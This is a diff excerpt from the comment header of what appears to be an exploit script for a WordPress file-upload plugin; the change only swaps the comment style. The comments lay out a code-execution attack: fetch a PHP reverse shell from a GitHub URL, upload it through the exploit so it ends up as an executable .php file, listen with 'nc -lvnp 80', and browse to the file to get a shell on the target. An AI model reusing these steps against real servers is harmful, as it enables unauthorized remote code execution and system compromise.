@@ -17,7 +17,7 @@
 # Method 1:
 # Code execution
 #  1. Create a php file in the same folder as the exploit containg a reverse_shell.php code. (Try port 80)
-#     https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/main/reverse_shell.php            -- configure the host and proper IP evidently
+#     https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/main/reverse_shell.php            # evidently, configure the host and proper IP
 #  2. [*] Enter File Name (working directory): reverse_shell.php
 #     [*] Enter protocol (http/https): http
 #     [+] File renamed to reverse_shell.png
@@ -25,7 +25,7 @@
 #        URL: http://192.168.68.105/wp-content/uploads/simple-file-list/reverse_shell.php
 ### Shell it
 #  3. nc -lvnp 80
-#  4. Access http://192.168.68.105/wp-content/uploads/simple-file-list/reverse_shell.php      -- you should obtain a shell of the system
+#  4. Access http://192.168.68.105/wp-content/uploads/simple-file-list/reverse_shell.php      # you should obtain a shell of the system
 
 # Method 2:
 # Command Injection
